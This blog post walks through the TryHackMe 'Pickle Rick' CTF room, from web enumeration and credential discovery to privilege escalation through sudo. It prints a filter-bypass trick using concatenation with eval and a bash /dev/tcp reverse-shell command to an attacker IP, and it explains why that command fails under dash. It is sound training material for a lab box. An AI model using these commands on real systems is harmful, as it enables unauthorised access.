---
layout: post
title:  "Pickle Rick - TryHackMe"
author: "dnstun0 (Jim Keeler)"
date:   2021-12-31 13:44:00 -0500
categories: tryhackme writeup
---
![Pickle Rick Banner](/assets/img/20211230211943.png)

[Pickle Rick](https://tryhackme.com/room/picklerick) was a fun Rick and Morty themed CTF box from [TryHackMe](https://tryhackme.com). As you make your way through the system, you collect text files containing ingredients to turn Rick back into a human. There are three files; two of which are accessible to the www-data user. To read the third file, you must be root. You can gain initial access just by following a typical web enumeration methodology. Once inside the admin portal, there's a built-in web shell with some rudimentary restrictions that can be easily bypassed. Getting a shell is trivial and then the www-data user has NOPASSWD sudo privileges for instant root access.

> 🔔 Please note: To comply with TryHackMe's write-up requirements, I've included a link to TryHackMe above and redacted all passwords, cracked hashes, and flags.

## Initial Enumeration
I started my enumeration with a quick port scan.

```console
$ nmap -T4 -A picklerick
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-28 21:27 EST
Nmap scan report for picklerick
Host is up (0.12s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ec:7c:a4:c1:18:64:aa:b7:8f:3f:bd:99:8c:c4:a1:07 (RSA)
|   256 05:a7:9f:d3:5f:0a:86:ba:16:a7:1a:be:1d:75:4e:b9 (ECDSA)
|_  256 a2:20:e4:a1:66:79:c5:6a:f3:82:b0:60:86:a6:55:58 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Rick is sup4r cool
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=12/28%OT=22%CT=1%CU=42167%PV=Y%DS=4%DC=T%G=Y%TM=61CBC7
OS:CD%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=109%TI=Z%CI=I%II=I%TS=8)SE
OS:Q(SP=102%GCD=1%ISR=109%TI=Z%CI=I%TS=8)OPS(O1=M506ST11NW7%O2=M506ST11NW7%
OS:O3=M506NNT11NW7%O4=M506ST11NW7%O5=M506ST11NW7%O6=M506ST11)WIN(W1=68DF%W2
OS:=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M506NNS
OS:NW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%
OS:DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%
OS:O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%
OS:W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%
OS:RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.14 seconds
```

With a pair of ports to look at, I kicked off a longer more complete scan (`nmap -T4 -A -p- picklerick`) and opened my browser.

![](/assets/img/20211228212612.png)

Not much to look at. There aren't any links or forms. Let's take a look at the page source.

```html
...
  <div class="container">
    <div class="jumbotron"></div>
    <h1>Help Morty!</h1></br>
    <p>Listen Morty... I need your help, I've turned myself into a pickle again and this time I can't change back!</p></br>
    <p>I need you to <b>*BURRRP*</b>....Morty, logon to my computer and find the last three secret ingredients to finish my pickle-reverse potion. The only problem is,
    I have no idea what the <b>*BURRRRRRRRP*</b>, password was! Help Morty, Help!</p></br>
  </div>

  <!--

    Note to self, remember username!

    Username: R1ckRul3s

  -->

</body>
</html>
```

Ah, a user name! Let's quickly try it on the SSH port.

```console
$ ssh R1ckRul3s@picklerick
R1ckRul3s@picklerick: Permission denied (publickey).
```

Interesting...we can't SSH into the machine without a key. Maybe we'll find one later. Meanwhile, my deep scan did not produce any other open ports.

Next, let's run a feroxbuster scan for other pages and directories.

> 🔔 Be sure to give your discovery tool some file extensions to use in its search!

![](/assets/img/20211228215102.png)

Only an assets directory is available and it doesn't have anything that helps us. Just a few images, bootstrap, and jquery.

```text
Index of /assets

[ICO]   Name    Last modified   Size    Description
[DIR]   Parent Directory        -
[TXT]   bootstrap.min.css   2019-02-10 16:37    119K	 
[   ]   bootstrap.min.js    2019-02-10 16:37    37K	 
[IMG]   fail.gif            2019-02-10 16:37    49K	 
[   ]   jquery.min.js       2019-02-10 16:37    85K	 
[IMG]   picklerick.gif      2019-02-10 16:37    222K	 
[IMG]   portal.jpg          2019-02-10 16:37    50K	 
[IMG]   rickandmorty.jpeg   2019-02-10 16:37    488K	 

Apache/2.4.18 (Ubuntu) Server at picklerick Port 80
```

Let's run feroxbuster again with a different wordlist. The first run used _directory-list-lowercase-2.3-medium.txt_. This time we'll use _common.txt_.

![](/assets/img/20211228221129.png)

Of course! I totally forgot to check _robots.txt_.

robots.txt
```text
REDACTED
```

Well, that doesn't give us anything new to look at. Okay, let's try Nikto.

```console
$ nikto -url http://picklerick
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.132.139
+ Target Hostname:    picklerick
+ Target Port:        80
+ Start Time:         2021-12-28 22:17:49 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Server may leak inodes via ETags, header found with file /, inode: 426, size: 5818ccf125686, mtime: gzip
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
+ Cookie PHPSESSID created without the httponly flag
+ OSVDB-3233: /icons/README: Apache default file found.
+ /login.php: Admin login page/section found.
+ 7681 requests: 0 error(s) and 9 item(s) reported on remote host
+ End Time:           2021-12-28 22:34:05 (GMT-5) (976 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

And there's my mistake. I wasn't running feroxbuster with any file extensions. Nikto found an admin login page for me.

![](/assets/img/20211228223600.png)

## Admin Portal Access

We probably have a valid username (found in the HTML source), but no password. As I was preparing to mount a brute force attack, I took a mental inventory of obscure information I'd come across so far. What about the odd content I found in _robots.txt_? Let's try it: `R1ckRul3s:REDACTED`

![](/assets/img/20211228224327.png)

It worked! There also appears to be a built in web shell. It has some restrictions. We can't run the `cat` command.

## Bypassing Web Shell Restrictions

![](/assets/img/20211228224941.png)

That's easily bypassed though. We can construct a command string by contcatenating strings together like this:

```console
var1="c"; var2="at"; eval "$var1$var2 /etc/passwd"
```

And it works perfectly.

![[Pasted image 20211228225015.png]]

### First Ingredient

Let's see what's in the web directory (`ls /var/www/html`).

```text
total 40
drwxr-xr-x 3 root   root   4096 Feb 10  2019 .
drwxr-xr-x 3 root   root   4096 Feb 10  2019 ..
-rwxr-xr-x 1 ubuntu ubuntu   17 Feb 10  2019 Sup3rS3cretPickl3Ingred.txt
drwxrwxr-x 2 ubuntu ubuntu 4096 Feb 10  2019 assets
-rwxr-xr-x 1 ubuntu ubuntu   54 Feb 10  2019 clue.txt
-rwxr-xr-x 1 ubuntu ubuntu 1105 Feb 10  2019 denied.php
-rwxrwxrwx 1 ubuntu ubuntu 1062 Feb 10  2019 index.html
-rwxr-xr-x 1 ubuntu ubuntu 1438 Feb 10  2019 login.php
-rwxr-xr-x 1 ubuntu ubuntu 2044 Feb 10  2019 portal.php
-rwxr-xr-x 1 ubuntu ubuntu   17 Feb 10  2019 robots.txt
```

Looks like we found our first ingredient. Let's cat the file using the obfuscation method used earlier (`var1="c"; var2="at"; eval "$var1$var2 /var/www/html/Sup3rS3cretPickl3Ingred.txt"`).

```text
REDACTED
```

Maybe the clue file will help us with the next ingredient (`var1="c"; var2="at"; eval "$var1$var2 /var/www/html/clue.txt"`).

```text
Look around the file system for the other ingredient.
```

## Opening a Reverse Shell

We could continue to use the web shell, but it'll be easier to move around the system with a fully functional shell. There are many options here. We could:
1. Hijack _index.html_ by renaming it to _index.php_ and overwrite it with a PHP reverse shell.
2. Generate a reverse shell binary with `msfvenom`, write it to _tmp_, and execute it.
3. Directly invoke a reverse shell from the web shell.

The third option seems the simplest, although I had a lot of issues getting a stable shell. I ultimately used option two and then after completing the objectives I dug into why my shells weren't working. See the [[#Shell Failure Analysis]] section for more information.

### Second Ingredient

Using the web shell, we can open a bash reverse shell (`bash -c 'bash -i >& /dev/tcp/10.0.0.100/4444 0>&1'`) as the www-data user.

```console
$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [parrot] from (UNKNOWN) [picklerick] 40300
bash: cannot set terminal process group (1336): Inappropriate ioctl for device
bash: no job control in this shell
www-data@picklerick:/var/www/html$ whoami
whoami
www-data
www-data@picklerick:/var/www/html$ 
```

It's now much easier to move around the system and we quickly find there's a home directory for rick with the second ingredient.

```console
www-data@picklerick:/var/www/html$ cd /home
cd /home
www-data@picklerick:/home$ ls -al
ls -al
total 16
drwxr-xr-x  4 root   root   4096 Feb 10  2019 .
drwxr-xr-x 23 root   root   4096 Dec 31 00:44 ..
drwxrwxrwx  2 root   root   4096 Feb 10  2019 rick
drwxr-xr-x  4 ubuntu ubuntu 4096 Dec 31 02:51 ubuntu
www-data@picklerick:/home$ cd rick
cd rick
www-data@picklerick:/home/rick$ ls -al
ls -al
total 12
drwxrwxrwx 2 root root 4096 Feb 10  2019 .
drwxr-xr-x 4 root root 4096 Feb 10  2019 ..
-rwxrwxrwx 1 root root   13 Feb 10  2019 second ingredients
www-data@picklerick:/home/rick$ cat second\ ingredients
cat second\ ingredients
REDACTED
www-data@picklerick:/home/rick$ 
```

## Privilege Escalation
### Third Ingredient
Finally, we need root access to get the third ingredient. Let's start by checking sudo privileges.

```console
www-data@picklerick:/home/rick$ sudo -l
sudo -l
Matching Defaults entries for www-data on
    picklerick.eu-west-1.compute.internal:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on
        picklerick.eu-west-1.compute.internal:
    (ALL) NOPASSWD: ALL
www-data@picklerick:/home/rick$ 
```

```console
www-data@picklerick:/home/rick$ sudo su -
sudo su -
mesg: ttyname failed: Inappropriate ioctl for device
whoami
root
ls -al
total 28
drwx------  4 root root 4096 Feb 10  2019 .
drwxr-xr-x 23 root root 4096 Dec 31 00:44 ..
-rw-r--r--  1 root root   29 Feb 10  2019 3rd.txt
-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
drwxr-xr-x  3 root root 4096 Feb 10  2019 snap
drwx------  2 root root 4096 Feb 10  2019 .ssh
cat 3rd.txt
REDACTED
```

That's all three ingredients! Keep reading if you're curious why you have to double your bash command to get a proper reverse shell.

## Shell Failure Analysis
While experimenting with reverse shells through the web shell, I couldn't get the bash reverse shell to work.

```console
bash -i >& /dev/tcp/10.0.0.100/4444 0>&1
```

I'd just get an empty response. An empty response made some sense: PHP wasn't capturing stderr and shipping it back through the browser, it was just relaying stdout. I wanted to see that error output, so I used my root access to add an authorized key to the ubuntu user and SSH'd into the box. Next I examined the web shell code in the _portal.php_ file. It was just doing a PHP `shell_exec` and returning the output.

I started an interactive PHP session and emulated this functionality.

```console
ubuntu@picklerick:~$ php -a
Interactive mode enabled

php > echo(shell_exec("bash -i >& /dev/tcp/10.0.0.100/4444 0>&1"));
sh: 1: Syntax error: Bad fd number
php > 
```

Bad fd number? At first I was confused, but then as I thought about it I figured it must be referring to the stderr or stdout file descriptors referenced in the command. I needed more information though; the 0 and 1 seemed to be in the correct place.

I found [this answer](https://unix.stackexchange.com/a/407800) on the UNIX & Linux Stack Exchange:
> `>&` is the **csh** syntax (also supported by `zsh` and recent versions of `bash`) to redirect both stdout and stderr to a file.

I found another unrelated post (I, of course, cannot find as I'm writing this) that provided me with a bit more context: _/bin/sh_ is usually mapped to _/bin/dash_, and _/bin/dash_ does not support this syntax.

Using [this command](https://stackoverflow.com/a/3327108), let's see what shell gets used by `shell_exec`.

```console
php > echo(shell_exec("ps -p $$"));
  PID TTY          TIME CMD
 2121 pts/0    00:00:00 sh
php > 
```

 It's `sh`, and it's mapped to `dash` too.

```console
$ ls -al /bin/sh
lrwxrwxrwx 1 root root 4 Nov  3 22:06 /bin/sh -> dash
```

 That explains why my shell kept failing; and why to make it work you have to double your `bash` command.

```console
bash -c 'bash -i >& /dev/tcp/10.0.0.100/4444 0>&1'
```

When I ran just the single quoted part of the above command, it was executing inside a `dash` shell. `dash` doesn't understand the `>&` syntax to direct the interactive bash shell into. I have to wrap that command inside a `bash -c` so that it executes inside a `bash` shell which _does_ understand the `>&` syntax.

I've come across this before and never had time to investigate. I hope this extra analysis saves someone else the trouble.
